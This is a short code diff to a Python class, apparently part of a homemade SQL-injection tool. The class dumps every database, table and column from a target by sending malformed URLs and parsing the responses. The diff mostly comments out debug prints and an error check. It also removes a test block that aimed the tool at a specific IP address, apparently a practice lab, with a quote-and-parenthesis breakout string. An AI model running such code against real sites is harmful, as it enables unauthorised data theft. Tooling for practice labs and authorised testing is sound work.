@@ -138,13 +138,12 @@ class Injection():
             columns: list 每一项str,表示一个列
         '''
         if len(database) != 0 and len(table) != 0 and len(columns) != 0:
-        # if database != None and table != None and columns != None:
             # 指定搜索
             # 查找到所有数据，每一行以空格相隔, 每行数据以逗号相隔
             data = self._analysis_data(database, table, columns, ' ')
             for data_line in data:
                 self.database.add_data(database, table, columns, data_line.split(','))
-                self.database.show_data(database, table, columns)
+            # self.database.show_data(database, table, columns)
         else:
             # 搜索所有库的所有表的所有列的所有数据
             for db in self.database.get_databases():
@@ -152,10 +151,6 @@ class Injection():
                     columns = self.database.get_columns(db, tb)
                     data = self._analysis_data(db, tb, columns)
                     for data_line in data:
-                        # print("database: " + db)
-                        # print("\ttable:" + tb)
-                        # print("\t\tcolumns: " + str(columns))
-                        # print("\t\t\tdata: " + data_line)
                         self.database.add_data(db, tb, columns, data_line.split('`'))
 
     def _analysis_data(self, database='', table='', columns=[], split_char=','):
@@ -171,8 +166,8 @@ class Injection():
         if self.arguments.options.show_level:
             self.output.info(url_malformation)
         result = self.page_info.get_info(url_malformation)
-        if result == '':
-            self.output.error(F"result 结果异常,url: {url_malformation}")
+        # if result == '':
+        #     self.output.error(F"result 结果异常,url: {url_malformation}")
         return result.split(split_char)
 
     def _get_serial_num(self):
@@ -190,11 +185,6 @@ class Injection():
             self.output.warning("未能探测成功")
         self._serial_num = serial_num + 1
 
-
-if __name__ == '__main__':
-    inject = Injection('http://47.95.4.158:8002/Less-3/?id=2', '\') ')
-    # inject.exec_payload(1, 5, 'information_schema', 'CHARACTER_SETS')
-    inject.exec_payload(1, 4)
 
 
 
